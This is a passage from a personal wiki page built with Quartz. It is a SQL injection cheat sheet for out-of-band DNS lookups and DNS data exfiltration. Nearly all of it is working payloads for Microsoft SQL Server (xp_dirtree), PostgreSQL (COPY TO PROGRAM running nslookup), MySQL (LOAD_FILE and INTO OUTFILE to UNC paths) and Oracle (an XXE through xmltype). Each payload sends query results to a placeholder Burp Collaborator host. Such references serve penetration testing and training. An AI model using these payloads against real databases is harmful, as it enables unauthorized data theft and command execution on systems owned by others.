</span></span></span></code></pre></td></tr></table></div></div><ul><li><em>Microsoft</em> <code>exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'</code></li><li><em>PostgreSQL</em> <code>copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'</code></li><li><em>MySQL</em> WINDOWS ONLY: <code>LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a');SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'</code></li></ul><a href=#dns-data-exfiltration><h3 id=dns-data-exfiltration><span class=hanchor arialabel=Anchor># </span>DNS Data Exfiltration</h3></a><ol><li><p>Oracle</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=n>xmltype</span><span class=p>(</span><span class=s1>&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &#34;http://&#39;</span><span class=o>||</span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=n>YOUR</span><span class=o>-</span><span class=n>QUERY</span><span class=o>-</span><span class=n>HERE</span><span class=p>)</span><span class=o>||</span><span class=s1>&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&#34;&gt; %remote;]&gt;&#39;</span><span class=p>),</span><span class=s1>&#39;/l&#39;</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dual</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div></li><li><p>Microsoft</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>declare</span><span class=w> </span><span class=o>@</span><span class=n>p</span><span class=w> </span><span class=nb>varchar</span><span class=p>(</span><span class=mi>1024</span><span class=p>);</span><span class=k>set</span><span class=w> </span><span class=o>@</span><span class=n>p</span><span class=o>=</span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=n>YOUR</span><span class=o>-</span><span class=n>QUERY</span><span class=o>-</span><span class=n>HERE</span><span class=p>);</span><span class=k>exec</span><span class=p>(</span><span class=s1>&#39;master..xp_dirtree &#34;//&#39;</span><span class=o>+@</span><span class=n>p</span><span class=o>+</span><span class=s1>&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&#34;&#39;</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div></li><li><p>PostgreSQL</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>--create OR replace function f() returns void as $$
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>declare</span><span class=w> </span><span class=k>c</span><span class=w> </span><span class=nb>text</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>declare</span><span class=w> </span><span class=n>p</span><span class=w> </span><span class=nb>text</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>begin</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>p</span><span class=w> </span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=n>YOUR</span><span class=o>-</span><span class=n>QUERY</span><span class=o>-</span><span class=n>HERE</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>c</span><span class=w> </span><span class=p>:</span><span class=o>=</span><span class=w> </span><span class=s1>&#39;copy (SELECT &#39;&#39;&#39;&#39;) to program &#39;&#39;nslookup &#39;</span><span class=o>||</span><span class=n>p</span><span class=o>||</span><span class=s1>&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;&#39;&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>execute</span><span class=w> </span><span class=k>c</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>END</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>$$</span><span class=w> </span><span class=k>language</span><span class=w> </span><span class=n>plpgsql</span><span class=w> </span><span class=k>security</span><span class=w> </span><span class=k>definer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=n>f</span><span class=p>();</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div></li><li><p>MySQL</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- WINDOWS ONLY
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=n>YOUR</span><span class=o>-</span><span class=n>QUERY</span><span class=o>-</span><span class=n>HERE</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=n>OUTFILE</span><span class=w> </span><span class=s1>&#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div></li></ol><script src=https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js></script>
<script>mermaid.initialize({startOnLoad:!0,theme:"dark"}),GnuplotRenderer.renderPage()</script></article><hr><div class=page-end><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li>No backlinks found</li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282;--g-node-tag:#e8c410}</style><script src=https://wiki.yigit.run/js/graph.2bdcb20a9aaee1234c2a6e0372a1a485.js></script></div></div><div id=contact_buttons><footer><p>Made by Yigit Colakoglu using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, Â© 2022</p><ul><li><a href=https://wiki.yigit.run/>Home</a></li><li><a href=https://twitter.com/yigitclkl>Twitter</a></li><li><a href=https://github.com/theFr1nge>Github</a></li></ul></footer></div></div></body></html>